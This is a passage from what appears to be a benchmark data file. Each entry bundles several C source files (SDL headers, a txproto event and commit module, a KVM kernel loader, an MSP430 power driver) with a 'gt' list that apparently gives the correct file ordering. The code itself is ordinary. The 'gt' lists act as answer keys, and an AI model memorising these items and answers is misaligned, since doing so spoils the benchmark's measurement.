Uint8 *SDLCALL SDL_GetKeyboardState(int *numkeys);\n\n\nextern DECLSPEC SDL_Keymod SDLCALL SDL_GetModState(void);\n\n\nextern DECLSPEC void SDLCALL SDL_SetModState(SDL_Keymod modstate);\n\n\nextern DECLSPEC SDL_Keycode SDLCALL SDL_GetKeyFromScancode(SDL_Scancode scancode);\n\n\nextern DECLSPEC SDL_Scancode SDLCALL SDL_GetScancodeFromKey(SDL_Keycode key);\n\n\nextern DECLSPEC const char *SDLCALL SDL_GetScancodeName(SDL_Scancode scancode);\n\n\nextern DECLSPEC SDL_Scancode SDLCALL SDL_GetScancodeFromName(const char *name);\n\n\nextern DECLSPEC const char *SDLCALL SDL_GetKeyName(SDL_Keycode key);\n\n\nextern DECLSPEC SDL_Keycode SDLCALL SDL_GetKeyFromName(const char *name);\n\n\nextern DECLSPEC void SDLCALL SDL_StartTextInput(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_IsTextInputActive(void);\n\n\nextern DECLSPEC void SDLCALL SDL_StopTextInput(void);\n\n\nextern DECLSPEC void SDLCALL SDL_SetTextInputRect(SDL_Rect *rect);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasScreenKeyboardSupport(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_IsScreenKeyboardShown(SDL_Window *window);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_keyboard.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'txproto/src/include/libtxproto/bufferlist.h'",
            "'txproto/src/include/libtxproto/commit.h'",
            "'txproto/src/commit.c'",
            "'txproto/src/include/libtxproto/events.h'"
        ],
        "content": "'txproto/src/include/libtxproto/bufferlist.h'\n:\n\n#pragma once\n\n#include <libavutil/buffer.h>\n\n\ntypedef struct SPBufferList SPBufferList;\ntypedef AVBufferRef *(*sp_buflist_find_fn)(AVBufferRef *entry, void *opaque);\nSPBufferList *sp_bufferlist_new(void);\nvoid          sp_bufferlist_free(SPBufferList **s);\nint           sp_bufferlist_len(SPBufferList *list);\nint           sp_bufferlist_copy(SPBufferList *dst, SPBufferList *src);\nint           sp_bufferlist_append(SPBufferList *list, AVBufferRef *entry);\nint           sp_bufferlist_append_noref(SPBufferList *list, AVBufferRef *entry);\n\n\nAVBufferRef  *sp_bufferlist_ref(SPBufferList *list, sp_buflist_find_fn find, void *find_opaque);\nAVBufferRef  *sp_bufferlist_pop(SPBufferList *list, sp_buflist_find_fn find, void *find_opaque);\nAVBufferRef  *sp_bufferlist_find_fn_first(AVBufferRef *entry, void *opaque);\nAVBufferRef  *sp_bufferlist_find_fn_data(AVBufferRef *entry, void *opaque);\n\n\nAVBufferRef  *sp_bufferlist_iter_ref(SPBufferList *list);\nvoid          sp_bufferlist_iter_halt(SPBufferList *list);\n\n'txproto/src/include/libtxproto/commit.h'\n:\n\n#pragma once\n\n#include <libavutil/buffer.h>\n\n#include <libtxproto/events.h>\n#include <libtxproto/txproto_main.h>\n\n\nint sp_add_commit_fn_to_list(TXMainContext *ctx, ctrl_fn fn,\n                             AVBufferRef *fn_ctx);\n\nint sp_add_discard_fn_to_list(TXMainContext *ctx, ctrl_fn fn,\n                              AVBufferRef *fn_ctx);\n\n'txproto/src/commit.c'\n:\n\n#include <libtxproto/commit.h>\n\ntypedef struct SPCommitCbCtx {\n    ctrl_fn fn;\n    AVBufferRef *fn_ctx;\n} SPCommitCbCtx;\n\n\nstatic int api_commit_cb(AVBufferRef *event_ref, void *callback_ctx,\n                         void *ctx, void *dep_ctx, void *data)\n{\n    SPCommitCbCtx *cb_ctx = callback_ctx;\n    return cb_ctx->fn(cb_ctx->fn_ctx, SP_EVENT_CTRL_COMMIT, NULL);\n}\n\n\nstatic int api_discard_cb(AVBufferRef *event_ref, void *callback_ctx,\n                          void *ctx, void *dep_ctx, void *data)\n{\n    SPCommitCbCtx *cb_ctx = callback_ctx;\n    return cb_ctx->fn(cb_ctx->fn_ctx, SP_EVENT_CTRL_DISCARD, NULL);\n}\n\nstatic void api_commit_free(void *callback_ctx, void *ctx, void *dep_ctx)\n{\n    SPCommitCbCtx *cb_ctx = callback_ctx;\n    av_buffer_unref(&cb_ctx->fn_ctx);\n}\n\nint sp_add_discard_fn_to_list(TXMainContext *ctx, ctrl_fn fn,\n                              AVBufferRef *fn_ctx)\n{\n    int err;\n    SPEventType type = sp_class_to_event_type(fn_ctx->data);\n    type |= SP_EVENT_FLAG_ONESHOT | SP_EVENT_ON_DISCARD;\n\n    AVBufferRef *discard_event = sp_event_create(api_discard_cb,\n                                                 api_commit_free,\n                                                 sizeof(SPCommitCbCtx),\n                                                 NULL,\n                                                 type,\n                                                 fn_ctx->data,\n                                                 NULL);\n\n    SPCommitCbCtx *api_discard_ctx = av_buffer_get_opaque(discard_event);\n    api_discard_ctx->fn = fn;\n    api_discard_ctx->fn_ctx = av_buffer_ref(fn_ctx);\n\n    if ((err = sp_eventlist_add(ctx, ctx->events, discard_event, 0)) < 0) {\n        av_buffer_unref(&discard_event);\n        return err;\n    }\n\n    return 0;\n}\n\nint sp_add_commit_fn_to_list(TXMainContext *ctx, ctrl_fn fn,\n                             AVBufferRef *fn_ctx)\n{\n    int err;\n    SPEventType type = sp_class_to_event_type(fn_ctx->data);\n    type |= SP_EVENT_FLAG_ONESHOT | SP_EVENT_ON_COMMIT;\n\n    AVBufferRef *commit_event = sp_event_create(api_commit_cb,\n                                                 api_commit_free,\n                                                 sizeof(SPCommitCbCtx),\n                                                 NULL,\n                                                 type,\n                                                 fn_ctx->data,\n                                                 NULL);\n\n    SPCommitCbCtx *api_commit_ctx = av_buffer_get_opaque(commit_event);\n    api_commit_ctx->fn = fn;\n    api_commit_ctx->fn_ctx = av_buffer_ref(fn_ctx);\n\n    if ((err = sp_eventlist_add(ctx, ctx->events, commit_event, 0)) < 0) {\n        av_buffer_unref(&commit_event);\n        return err;\n    }\n\n    sp_add_discard_fn_to_list(ctx, fn, fn_ctx);\n\n    return 0;\n}\n\n'txproto/src/include/libtxproto/events.h'\n:\n\n#pragma once\n\n#include <pthread.h>\n\n#include <libtxproto/bufferlist.h>\n\n\ntypedef enum SPEventType {\n\n    SP_EVENT_ON_COMMIT       = (1ULL <<  0),\n    SP_EVENT_ON_DISCARD      = (1ULL <<  1),\n    SP_EVENT_ON_CONFIG       = (1ULL <<  2),\n    SP_EVENT_ON_INIT         = (1ULL <<  3),\n    SP_EVENT_ON_CHANGE       = (1ULL <<  4),\n    SP_EVENT_ON_STATS        = (1ULL <<  5),\n    SP_EVENT_ON_EOS          = (1ULL <<  6),\n    SP_EVENT_ON_ERROR        = (1ULL <<  7),\n    SP_EVENT_ON_DESTROY      = (1ULL <<  8),\n    SP_EVENT_ON_OUTPUT       = (1ULL <<  9),\n    SP_EVENT_ON_MASK         = (((1ULL << 16) - 1) <<  0),\n\n\n    SP_EVENT_TYPE_LINK       = (1ULL << 16),\n    SP_EVENT_TYPE_SOURCE     = (1ULL << 17),\n    SP_EVENT_TYPE_SINK       = (1ULL << 18),\n    SP_EVENT_TYPE_FILTER     = (1ULL << 19),\n    SP_EVENT_TYPE_BSF        = (1ULL << 20),\n    SP_EVENT_TYPE_ENCODER    = (1ULL << 21),\n    SP_EVENT_TYPE_DECODER    = (1ULL << 22),\n    SP_EVENT_TYPE_MUXER      = (1ULL << 23),\n    SP_EVENT_TYPE_DEMUXER    = (1ULL << 24),\n    SP_EVENT_TYPE_MASK       = (((1ULL << 16) - 1) << 16),\n\n\n    SP_EVENT_CTRL_START      = (1ULL << 32),\n    SP_EVENT_CTRL_STOP       = (1ULL << 33),\n    SP_EVENT_CTRL_OPTS       = (1ULL << 34),\n    SP_EVENT_CTRL_FLUSH      = (1ULL << 35),\n    SP_EVENT_CTRL_COMMAND    = (1ULL << 36),\n    SP_EVENT_CTRL_NEW_EVENT  = (1ULL << 37),\n    SP_EVENT_CTRL_DEL_EVENT  = (1ULL << 38),\n    SP_EVENT_CTRL_COMMIT     = (1ULL << 39),\n    SP_EVENT_CTRL_DISCARD    = (1ULL << 40),\n    SP_EVENT_CTRL_SIGNAL     = (1ULL << 41),\n    SP_EVENT_CTRL_MASK       = (((1ULL << 16) - 1) << 32),\n\n\n    SP_EVENT_FLAG_UNIQUE     = (1ULL << 48),\n    SP_EVENT_FLAG_DEPENDENCY = (1ULL << 49),\n    SP_EVENT_FLAG_IMMEDIATE  = (1ULL << 50),\n    SP_EVENT_FLAG_EXPIRED    = (1ULL << 51),\n    SP_EVENT_FLAG_ONESHOT    = (1ULL << 52),\n    SP_EVENT_FLAG_MASK       = (((1ULL << 16) - 1) << 48),\n} SPEventType;\n\ntypedef struct SPEvent SPEvent;\n\n\nSPEventType sp_class_to_event_type(void *ctx);\n\n\ntypedef int (*event_fn)(AVBufferRef *event_ref, void *callback_ctx, void *ctx,\n                        void *dep_ctx, void *data);\n\n\ntypedef void (*event_free)(void *callback_ctx, void *ctx, void *dep_ctx);\n\n\nAVBufferRef *sp_event_create(event_fn cb,\n                             event_free destroy_cb,\n                             size_t callback_ctx_size,\n                             pthread_mutex_t *lock,\n                             SPEventType type,\n                             void *ctx,\n                             void *dep_ctx);\n\n\nint sp_eventlist_add(void *ctx, SPBufferList *list, AVBufferRef *event, int ref);\n\n\nint sp_eventlist_add_signal(void *ctx, SPBufferList *list,\n                            AVBufferRef *event, SPEventType when, int ref);\n\n\nvoid sp_event_unref_expire(AVBufferRef **buf);\n\n\nvoid sp_event_unref_await(AVBufferRef **buf);\n\n\nint sp_eventlist_dispatch(void *ctx, SPBufferList *list, SPEventType type, void *data);\n\n\nSPEventType sp_eventlist_has_dispatched(SPBufferList *list, SPEventType type);\n\n\nSPEventType sp_eventlist_has_queued(SPBufferList *list, SPEventType type);\n\n\nchar *sp_event_flags_to_str_buf(AVBufferRef *event);\n\n\nchar *sp_event_flags_to_str(SPEventType flags);\n\n\nint sp_event_string_to_flags(void *ctx, SPEventType *dst, const char *in_str);\n\n\nuint64_t sp_event_get_id(AVBufferRef *event);\n\n\ntypedef int (*ctrl_fn)(AVBufferRef *ctx_ref, SPEventType ctrl, void *arg);\n",
        "gt": [
            "'txproto/src/include/libtxproto/bufferlist.h'",
            "'txproto/src/include/libtxproto/events.h'",
            "'txproto/src/include/libtxproto/commit.h'",
            "'txproto/src/commit.c'"
        ]
    },
    {
        "files": [
            "'wiser/src/vm.h'",
            "'wiser/src/kernel.h'",
            "'wiser/src/kernel.c'",
            "'wiser/src/vcpu.h'"
        ],
        "content": "'wiser/src/vm.h'\n:#ifndef VM_H\n#define VM_H\n\n#include <fcntl.h>\n#include <sys/ioctl.h>\n\nstruct vm {\n  int fd_kvm;\n  int fd_vm;\n  int fd_vcpu;\n\n  size_t mmap_size;\n  size_t ram_size;\n  struct kvm_run *run;\n  struct kvm_sregs sregs;\n  char *initramfs;\n  char *kernel_opts;\n};\n\nint vm_create(struct vm *v);\nint vm_init(struct vm *v);\nint vm_set_memory(struct vm *v);\n\n#endif\n\n'wiser/src/kernel.h'\n:#ifndef KERNEL_H\n#define KERNEL_H\n\n#include \"vcpu.h\"\n#include \"vm.h\"\n\n#define MEMORY_SIZE 1 << 30\n#define KERNEL_OPTS                                                            \\\n  \"init=/bin/init console=ttyS0  apm=off vsdo=0 reboot=1 \"                     \\\n  \"clocksource=kvm-clock noapic initcall_debug=1\"\n\nvoid *kernel_load(struct vm *v, char *path);\nuint64_t kernel_get_offset(struct setup_header *setup_header);\nvoid *kernel_setup_memory(struct vm *v);\nint kernel_init_boot(struct setup_header *setup_header, void *end_setup_header,\n                     char *ram_addr, char *kernel_options);\nvoid kernel_set_e820_entry(struct boot_e820_entry *entry, uint64_t addr,\n                           uint64_t size, uint32_t type);\n\n#endif\n\n'wiser/src/kernel.c'\n:#include <asm/bootparam.h>\n#include <asm/e820.h>\n#include <asm/processor-flags.h>\n#include <err.h>\n#include <fcntl.h>\n#include <linux/kvm.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/ioctl.h>\n#include <sys/mman.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n\n#include \"kernel.h\"\n#include \"vcpu.h\"\n#include \"vm.h\"\n\nstatic char *kernel_opts = KERNEL_OPTS;\n\nvoid *kernel_setup_memory(struct vm *vm) {\n  if (vm->ram_size == 0)\n    vm->ram_size = MEMORY_SIZE;\n  void *mem = mmap(NULL, vm->ram_size, PROT_READ | PROT_WRITE | PROT_EXEC,\n                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);\n  if (mem == MAP_FAILED) {\n    errx(1, \"mmap failed\");\n  }\n  struct kvm_userspace_memory_region region = {\n      .slot = 0,\n      .guest_phys_addr = 0x0,\n      .memory_size = vm->ram_size,\n      .userspace_addr = (uint64_t)mem,\n  };\n  int ret = ioctl(vm->fd_vm, KVM_SET_USER_MEMORY_REGION, &region);\n  if (ret == -1)\n    err(1, \"KVM_SET_USER_MEMORY_REGION\");\n  return mem;\n}\nvoid *kernel_load(struct vm *vm, char *path) {\n\n  size_t kernel_size;\n\n  int fd_image = open(path, O_RDWR);\n  if (fd_image < -1)\n    err(1, \"Unable to open image\");\n\n  struct stat statbuf;\n  fstat(fd_image, &statbuf);\n  size_t image_size = statbuf.st_size;\n\n  uint8_t *mem =\n      mmap(NULL, image_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd_image, 0);\n  if (mem == MAP_FAILED) {\n    errx(1, \"Failed while loading image into memory\");\n  }\n\n  struct setup_header *setup_header =\n      (struct setup_header *)((char *)mem + 0x01f1);\n\n  uint64_t offset_kernel = kernel_get_offset(setup_header);\n\n  char *ram_addr = kernel_setup_memory(vm);\n  void *end_header = mem + 0x0202 + *((char *)mem + 0x0201);\n\n\n  if (vm->kernel_opts != NULL)\n    kernel_opts = vm->kernel_opts;\n\n  kernel_init_boot(setup_header, end_header, ram_addr, kernel_opts);\n\n  kernel_size = image_size - offset_kernel;\n\n  memcpy(ram_addr + 0x100000, mem + offset_kernel, kernel_size);\n\n\n  if (vm->initramfs != NULL) {\n    int fd_initram = open(vm->initramfs, O_RDWR);\n    if (fd_initram < -1)\n      err(1, \"open initramfs image failed\");\n\n    struct stat statbuf;\n    fstat(fd_initram, &statbuf);\n    size_t initram_size = statbuf.st_size;\n\n    uint8_t *init_memory = mmap(NULL, initram_size, PROT_READ | PROT_WRITE,\n                                MAP_SHARED, fd_initram, 0);\n    if (init_memory == MAP_FAILED)\n      errx(1, \"initramfs: failed loading image\");\n\n    memcpy(ram_addr + kernel_size + 0x100000, init_memory, statbuf.st_size);\n    struct boot_params *initramfs_boot_param =\n        (struct boot_params *)(ram_addr + 0x6000 + 0x10000);\n    struct setup_header *setup_header = &(initramfs_boot_param->hdr);\n\n    setup_header->ramdisk_image = (uint64_t)(kernel_size + 0x100000);\n    setup_header->ramdisk_size = statbuf.st_size;\n  }\n\n  return ram_addr;\n}\n\nuint64_t kernel_get_offset(struct setup_header *setup_header) {\n  uint8_t setup_sects = setup_header->setup_sects;\n  if (setup_sects == 0)\n    setup_sects = 4;\n  return (setup_sects + 1) * 512;\n}\n\nint kernel_init_boot(struct setup_header *setup_header, void *end_setup_header,\n                     char *ram_addr, char *kernel_options) {\n  struct boot_params *params = (struct boot_params *)(ram_addr + 0x6000);\n  memset(params, 0, sizeof(struct boot_params));\n\n  memcpy(&(params->hdr), setup_header,\n         (uintptr_t)end_setup_header - (uintptr_t)setup_header);\n\n  if (params->hdr.setup_sects == 0)\n    params->hdr.setup_sects = 4;\n\n  params->hdr.type_of_loader = 0xff;\n  params->hdr.loadflags = 0;\n  params->hdr.loadflags |= KEEP_SEGMENTS;\n\n  params->hdr.loadflags &= ~QUIET_FLAG;\n  params->hdr.loadflags &= ~CAN_USE_HEAP;\n\n  uint8_t idx = 0;\n  struct boot_e820_entry *pre_isa = &params->e820_table[idx++];\n  struct boot_e820_entry *post_isa = &params->e820_table[idx++];\n\n  kernel_set_e820_entry(pre_isa, 0x0, ISA_START_ADDRESS - 1, E820_RAM);\n  kernel_set_e820_entry(post_isa, ISA_END_ADDRESS,\n                        (200 << 20) - ISA_END_ADDRESS, E820_RAM);\n\n  params->e820_entries = idx;\n  params->hdr.cmd_line_ptr = 0x6000 + 0x10000;\n  memcpy(ram_addr + 0x6000 + 0x10000, kernel_options, strlen(kernel_opts));\n  return 0;\n}\n\nvoid kernel_set_e820_entry(struct boot_e820_entry *entry, uint64_t addr,\n                           uint64_t size, uint32_t type) {\n  entry->addr = addr;\n  entry->size = size;\n  entry->type = type;\n}\n\n'wiser/src/vcpu.h'\n:#ifndef VCPU_H\n#define VCPU_H\n\n#include \"vm.h\"\n\nint cpu_create(struct vm *v);\nint cpu_setup_cpuid(struct vm *v);\nint cpu_setup_protected_mode(struct vm *v);\nint cpu_mmap(struct vm *v);\nint cpu_init_kernel(struct vm *v);\nint cpu_main(struct vm *v, char *addr);\n\n#endif\n",
        "gt": [
            "'wiser/src/vm.h'",
            "'wiser/src/vcpu.h'",
            "'wiser/src/kernel.h'",
            "'wiser/src/kernel.c'"
        ]
    },
    {
        "files": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/ldopwr.c'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/inc/hw_memmap.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/ldopwr.h'"
        ],
        "content": "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/ldopwr.c'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#ifdef __MSP430_HAS_PU__\n\n#include \"ldopwr.h\"\n\n\n\n#include <assert.h>\n\n\n\nvoid LDOPWR_unLockConfiguration ( uint16_t baseAddress )\n\n{\n\n    HWREG16(baseAddress + OFS_LDOKEYPID) = 0x9628;\n\n}\n\n\n\nvoid LDOPWR_lockConfiguration ( uint16_t baseAddress )\n\n{\n\n    HWREG16(baseAddress + OFS_LDOKEYPID) = 0x0000;\n\n}\n\n\n\nvoid LDOPWR_enablePort_U_inputs (uint16_t baseAddress )\n\n{\n\n    HWREG8(baseAddress + OFS_PUCTL_H) |= PUIPE_H;\n\n}\n\n\n\nvoid LDOPWR_disablePort_U_inputs (uint16_t baseAddress )\n\n{\n\n    HWREG8(baseAddress + OFS_PUCTL_H) &= ~PUIPE_H;\n\n}\n\n\n\nvoid LDOPWR_enablePort_U_outputs (uint16_t baseAddress )\n\n{\n\n    HWREG8(baseAddress + OFS_PUCTL_L) |= PUOPE;\n\n}\n\n\n\nvoid LDOPWR_disablePort_U_outputs (uint16_t baseAddress )\n\n{\n\n    HWREG8(baseAddress + OFS_PUCTL_L) &= ~PUOPE;\n\n}\n\n\n\nuint8_t LDOPWR_getPort_U1_inputData (uint16_t baseAddress )\n\n{\n\n    return ((HWREG8(baseAddress + OFS_PUCTL_L) & PUIN1) >> 3 );\n\n}\n\n\n\nuint8_t LDOPWR_getPort_U0_inputData (uint16_t baseAddress )\n\n{\n\n    return ((HWREG8(baseAddress + OFS_PUCTL_L) & PUIN0) >> 2 );\n\n}\n\n\n\nuint8_t LDOPWR_getPort_U1_outputData (uint16_t baseAddress )\n\n{\n\n    return ((HWREG8(baseAddress + OFS_PUCTL_L) & PUOUT1) >> 1 );\n\n}\n\n\n\nuint8_t LDOPWR_getPort_U0_outputData (uint16_t baseAddress )\n\n{\n\n    return (HWREG8(baseAddress + OFS_PUCTL_L) & PUOUT0);\n\n}\n\n\n\nvoid LDOPWR_setPort_U1_outputData (uint16_t baseAddress,\n\n    uint8_t value\n\n    )\n\n{\n\n    if (LDOPWR_PORTU_PIN_HIGH == value){\n\n        HWREG8(baseAddress + OFS_PUCTL_L) |= PUOUT1;\n\n    } else   {\n\n        HWREG8(baseAddress + OFS_PUCTL_L) &= ~PUOUT1;\n\n    }\n\n}\n\n\n\nvoid LDOPWR_setPort_U0_outputData (uint16_t baseAddress,\n\n    uint8_t value\n\n    )\n\n{\n\n    if (LDOPWR_PORTU_PIN_HIGH == value){\n\n        HWREG8(baseAddress + OFS_PUCTL_L) |= PUOUT0;\n\n    } else   {\n\n        HWREG8(baseAddress + OFS_PUCTL_L) &= ~PUOUT0;\n\n    }\n\n}\n\n\n\nvoid LDOPWR_togglePort_U1_outputData (uint16_t baseAddress)\n\n{\n\n    HWREG8(baseAddress + OFS_PUCTL_L) ^= PUOUT1;\n\n}\n\n\n\nvoid LDOPWR_togglePort_U0_outputData (uint16_t baseAddress)\n\n{\n\n    HWREG8(baseAddress + OFS_PUCTL_L) ^= PUOUT0;\n\n}\n\n\n\nvoid LDOPWR_enableInterrupt (uint16_t baseAddress,\n\n    uint16_t mask\n\n    )\n\n{\n\n    HWREG8(baseAddress + OFS_LDOPWRCTL_H) |= mask;\n\n}\n\n\n\nvoid LDOPWR_disableInterrupt (uint16_t baseAddress,\n\n    uint16_t mask\n\n    )\n\n{\n\n    HWREG8(baseAddress + OFS_LDOPWRCTL_H) &= ~mask;\n\n}\n\n\n\nvoid LDOPWR_enable (uint16_t baseAddress)\n\n{\n\n    HWREG8(baseAddress + OFS_LDOPWRCTL_H) |= LDOOEN_H;\n\n}\n\n\n\nvoid LDOPWR_disable (uint16_t baseAddress)\n\n{\n\n    HWREG8(baseAddress + OFS_LDOPWRCTL_H) &= ~LDOOEN_H;\n\n}\n\n\n\nuint8_t LDOPWR_getInterruptStatus (uint16_t baseAddress,\n\n    uint16_t mask\n\n    )\n\n{\n\n    return (HWREG8(baseAddress + OFS_LDOPWRCTL_L) & mask);\n\n}\n\n\n\nvoid LDOPWR_clearInterrupt (uint16_t baseAddress,\n\n    uint16_t mask\n\n    )\n\n{\n\n    HWREG8(baseAddress + OFS_LDOPWRCTL_L) &=  ~mask;\n\n}\n\n\n\nuint8_t LDOPWR_isLDOInputValid (uint16_t baseAddress)\n\n{\n\n    return (HWREG8(baseAddress + OFS_LDOPWRCTL_L) & LDOBGVBV);\n\n}\n\n\n\nvoid LDOPWR_enableOverloadAutoOff (uint16_t baseAddress)\n\n{\n\n    HWREG8(baseAddress + OFS_LDOPWRCTL_L) |= OVLAOFF_L;\n\n}\n\n\n\nvoid LDOPWR_disableOverloadAutoOff (uint16_t baseAddress)\n\n{\n\n    HWREG8(baseAddress + OFS_LDOPWRCTL_L) &= ~OVLAOFF_L;\n\n}\n\n\n\nuint8_t LDOPWR_getOverloadAutoOffStatus (uint16_t baseAddress)\n\n{\n\n    return (HWREG8(baseAddress + OFS_LDOPWRCTL_L) & OVLAOFF_L);\n\n}\n\n\n\n#endif\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/inc/hw_memmap.h'\n:\n\n#ifndef __HW_MEMMAP__\n\n#define __HW_MEMMAP__\n\n\n\n#define __DRIVERLIB_MSP430F5XX_6XX_FAMILY__\n\n\n\n\n\n\n\n\n\n\n\n#include <msp430.h>\n\n\n\n#include \"msp430f5xx_6xxgeneric.h\"\n\n\n\n#include \"stdint.h\"\n\n#include \"stdbool.h\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define STATUS_SUCCESS  0x01\n\n#define STATUS_FAIL     0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define NDEBUG\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define HWREG32(x)                                                              \\\n\n        (*((volatile uint32_t *)((uint16_t)x)))\n\n#define HWREG16(x)                                                             \\\n\n        (*((volatile uint16_t *)((uint16_t)x)))\n\n#define HWREG8(x)                                                             \\\n\n        (*((volatile uint8_t *)((uint16_t)x)))\n\n\n\n\n\n#endif\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/ldopwr.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __MSP430WARE_LDOPWR_H__\n\n#define __MSP430WARE_LDOPWR_H__\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#ifdef __MSP430_HAS_PU__\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\nextern \"C\"\n\n{\n\n#endif\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define LDOPWR_PORTU_PIN_HIGH                                            PUOUT0\n\n#define LDOPWR_PORTU_PIN_LOW                                               0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define LDOPWR_LDO_INPUT_VALID                                         LDOBGVBV\n\n#define LDOPWR_LDO_INPUT_INVALID                                           0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define LDOPWR_AUTOOFF_ENABLED                                        OVLAOFF_H\n\n#define LDOPWR_AUTOOFF_DISABLED                                            0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define LDOPWR_LDOI_VOLTAGE_GOING_OFF_INTERRUPT                      LDOOFFIE_H\n\n#define LDOPWR_LDOI_VOLTAGE_COMING_ON_INTERRUPT                       LDOONIE_H\n\n#define LDOPWR_LDO_OVERLOAD_INDICATION_INTERRUPT                     LDOOVLIE_H\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_unLockConfiguration(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_lockConfiguration(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_enablePort_U_inputs(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_disablePort_U_inputs(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_enablePort_U_outputs(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_disablePort_U_outputs(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t LDOPWR_getPort_U1_inputData(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t LDOPWR_getPort_U0_inputData(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t LDOPWR_getPort_U1_outputData(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t LDOPWR_getPort_U0_outputData(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_setPort_U1_outputData(uint16_t baseAddress,\n\n                                         uint8_t value);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_setPort_U0_outputData(uint16_t baseAddress,\n\n                                         uint8_t value);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_togglePort_U1_outputData(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_togglePort_U0_outputData(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_enableInterrupt(uint16_t baseAddress,\n\n                                   uint16_t 